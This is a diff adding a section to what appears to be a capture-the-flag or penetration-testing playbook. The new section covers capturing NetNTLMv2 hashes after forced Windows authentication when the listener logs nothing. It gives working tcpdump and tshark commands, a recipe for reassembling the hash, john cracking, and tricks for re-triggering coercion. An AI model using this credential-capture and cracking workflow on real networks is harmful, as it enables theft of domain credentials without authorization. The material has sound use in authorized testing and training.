@@ -106,3 +106,32 @@ Log the flag as soon as you can read it:
 cat ~/user.txt        # linux
 type C:\Users\<u>\Desktop\user.txt   # windows
 ```
+
+## When a capture tool logs nothing
+
+`impacket-smbserver` and `responder` can capture a NetNTLMv2 correctly while
+printing nothing at all. A silent listener is not evidence the coercion failed —
+restarting it a third time is wasted time. Put a capture on the callback
+interface and read the wire, which is ground truth:
+
+```bash
+pwnloop x "timeout 30 tcpdump -i tun0 -nn 'host <target> and port 445' -w /engagements/<e>/scans/coerce.pcap"
+# trigger the coercion, then:
+pwnloop x "tshark -r /engagements/<e>/scans/coerce.pcap -Y ntlmssp -T fields \
+  -e ntlmssp.auth.username -e ntlmssp.auth.domain \
+  -e ntlmssp.ntlmserverchallenge -e ntlmssp.auth.ntresponse"
+```
+
+An inbound SYN followed by a ~550-byte session-setup packet *is* the
+`NTLMSSP_AUTH`. Reassemble the fields as
+`user::domain:challenge:<ntresponse[:32]>:<ntresponse[32:]>` — the challenge is
+`aaaaaaaaaaaaaaaa` when impacket served it — and feed that to
+`john --format=netntlmv2`.
+
+Two traps around coercion:
+
+- **Windows negative-caches the UNC path**, so a second attempt against the same
+  `\\ip\share` produces no callback at all. Vary the share name each time.
+- **`pkill -f smbserver.py` matches its own shell**, killing the wrapper that
+  was about to restart the listener. Match a path fragment the launcher does not
+  contain, or kill by PID.
